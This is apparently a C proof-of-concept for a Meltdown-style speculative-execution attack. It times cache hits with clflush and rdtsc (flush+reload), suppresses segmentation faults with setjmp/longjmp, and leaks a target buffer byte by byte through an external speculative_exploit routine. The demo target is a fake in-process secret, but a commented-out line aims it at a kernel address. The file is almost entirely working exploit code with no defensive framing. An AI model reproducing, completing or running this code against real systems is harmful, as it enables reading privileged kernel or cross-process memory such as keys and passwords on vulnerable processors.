#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <assert.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <stdbool.h>
#include <setjmp.h>
#include <signal.h>

static const uint64_t CACHE_HIT_THRESHOLD = 200;
static const uint64_t NOISE_REDUCTION_CYCLES = 100;

static jmp_buf jmpr;

void speculative_exploit(const void *target_addr, void *comm_buf);

static void segfault_handler(int signum)
{
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
    longjmp(jmpr, 1);
}

void *setup_fake_secret()
{
    void *secret_buf = mmap(
        NULL,
        20,
        PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE,
        -1,
        0
    );
    strcpy((char *)secret_buf, "this is the secret");
    printf("secret at %p\n", secret_buf);
    return secret_buf;
}

void *setup_comm_buffer()
{
    return mmap(
        NULL,
        256 * 0x1000,
        PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE,
        -1,
        0
    );
}

void clear_cache(void *comm_buf)
{
    for (int i = 0; i < 256; i++)
    {
        void *addr = ((uint8_t *)comm_buf) + (i * 0x1000);
        // printf("clearing comm_buffer[%d]=%p\n", i, addr);
        _mm_clflush(addr);
    }
}

void access_page(void *comm_buf, uint8_t page)
{
    void *p = (uint8_t *)comm_buf + page * 0x1000;
    // printf("Accessing page %p\n", p);
    volatile uint64_t x = *(volatile uint64_t*)p;
}

bool is_page_cached(void *page, uint8_t i)
{
    uint64_t start, end;
    _mm_mfence();
    start = __rdtsc();
    volatile uint64_t x = *(volatile uint64_t*)page;
    _mm_mfence();
    end = __rdtsc();
    uint64_t time = end - start;

    // printf("measured comm_buffer[%d] = %p in %d\n", i, page, time);
    return time < CACHE_HIT_THRESHOLD;
}

void measure_pages_access(uint32_t *stats, void *comm_buf)
{
    for (size_t i = 0; i < 256; i++)
    {
        uint8_t mix_i = (uint8_t)(13 - i * 0x59);
        void *page = (uint8_t *)comm_buf + mix_i * 0x1000;
        if (is_page_cached(page, mix_i))
        {
            stats[mix_i] += 1;
        }
    }
}

uint8_t decode_stats(uint32_t *stats)
{
    uint32_t index = 0;
    uint32_t max_val = 0;
    for (uint32_t i = 0; i < 256; i++)
    {
        // printf("stats[%d] = %d\n", i, stats[i]);
        if (stats[i] > max_val)
        {
            max_val = stats[i];
            index = i;
        }
    }
    return (uint8_t)index;
}


uint8_t leak_secret(void *comm_buf, void *target_addr, uint32_t offset)
{
    uint32_t stats[256] = {0};

    for (int i = 0; i < NOISE_REDUCTION_CYCLES; i++)
    {
        if (!setjmp(jmpr))
        {
            clear_cache(comm_buf);
            void *addr = (uint8_t *)target_addr + offset;
            speculative_exploit(addr, comm_buf);
        }
        measure_pages_access(stats, comm_buf);
    }

    return decode_stats(stats);
}

int main(int argc, char **argv)
{
    uint8_t leaked_buf[20] = {0};

    if (signal(SIGSEGV, segfault_handler) == SIG_ERR)
    {
        printf("failed to setup signal hanlder\n");
        exit(1);
    }

    // void *secret = (void *)0xffffffffc0000010;
    void *secret = setup_fake_secret();
    void *comm_buf = setup_comm_buffer();

    for (int i = 0; i < sizeof(leaked_buf); i++)
    {
        leaked_buf[i] = leak_secret(comm_buf, secret, i);
        printf("leaked value %c (%d) - %s\n",
            leaked_buf[i],
            leaked_buf[i],
            leaked_buf
        );
    }

    return 0;
}
